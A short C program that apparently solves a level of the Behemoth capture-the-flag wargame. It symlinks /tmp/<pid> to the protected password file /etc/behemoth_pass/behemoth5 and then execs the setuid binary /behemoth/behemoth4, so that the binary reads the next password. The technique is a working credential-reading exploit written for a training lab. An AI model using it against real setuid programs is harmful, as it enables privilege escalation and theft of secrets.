#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char *const argv[], char *const envp[]) {
    printf("pid 1: %d\n", getpid());
    char path[100];
    sprintf(path, "ln -s /etc/behemoth_pass/behemoth5 /tmp/%d", getpid());
    system(path);
    execve("/behemoth/behemoth4", argv, envp); 
    return 0;
}
